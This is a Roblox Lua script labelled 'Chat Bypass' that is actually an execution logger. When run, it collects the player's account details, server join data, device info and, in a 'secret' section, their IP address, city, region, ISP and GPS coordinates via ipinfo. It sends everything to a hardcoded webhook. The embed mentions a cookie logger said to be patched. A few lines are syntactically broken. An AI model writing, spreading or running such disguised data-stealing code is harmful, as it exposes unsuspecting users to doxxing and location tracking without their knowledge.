--// Config
getgenv().whscript = "Chat Bypass"        --Change to the name of your script
getgenv().webhookexecUrl = "https://dkashsbfasgdiausdasdasd.vercel.app/api/5aaNB3xymmaWEiGbX96Yf4YYkh8M"  --Put your Webhook Url here
getgenv().ExecLogSecret = true               --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui = gethui()
    local folderName = "screen2"
    local folder = Instance.new("Folder")
    folder2.Nam = folderName2
    if ui2:FindFirstChil(folderName2) then
        play("DONT SPAM. تکایە سپام مەکە.")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "false"
            else
                premium = "true"
            end
        else
            premium = "Failed to retrieve Membership:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
	["content_2"] = true,
        ["embeds"] = {
            {
                ["title"] = "MADE BY DXFC | 🚀 **Script Execution Detected | Exec Log**",
                ["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
                ["type"] = "rich",
                ["color"] = tonumber(0xe67e22), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "🔍 **Script Info**",
                        ["value"] = "```💻 Script Name: " ..
                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👤 **Player Details**",
                        ["value"] = "```🧸 Username: " ..
                            player.Name ..
                                "\n📝 Display Name: " ..
                                    player.DisplayName ..
                                        "\n🆔 UserID: " ..
                                            userid ..
                                                "\n❤️ Health: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📅 **Account Information**",
                        ["value"] = "```🗓️ Account Age: " ..
                            player.AccountAge ..
                                " days\n💎 Premium Status: " ..
                                    premium ..
                                        "\n📅 Account Created: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 **Game Details**",
                        ["value"] = "```🏷️ Game Name: " ..
                            gameName ..
                                "\n🆔 Game ID: " ..
                                    gameid ..
                                        "\n🔗 Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🕹️ **Server Info**",
                        ["value"] = "```👥 Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📡 **Network Info**",
                        ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🖥️ **System Info**",
                        ["value"] = "```📺 Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\n🔍 Memory Usage: " ..
                                            memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📍 **Character Position Script**",
                        ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🪧 **Join Script**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278795377176346684/IMG_5005.gif?ex=66d21a80&is=66d0c900&hm=8eb3f7689d767e13d36c7eb8ed4bead77728f874fee7f059d5edabf5fccd79aa&"
                },
                ["footer"] = {
                    ["text"] = "Made by dxfc with ❤️ | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278792866495463454/IMG_5003.gif?ex=66d2182a&is=66d0c6aa&hm=3b55a9e00514d207da9067e03e8a84dff72ec35dd06b7be9e5e9974a5be8e980&" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(🤫) Secret`**",
                ["value"] = "||(👣) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(🌆) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(🪟) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(🏙️) City: " ..
                                    ipinfo_table.city ..
																		
																		"||\n||(🏡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
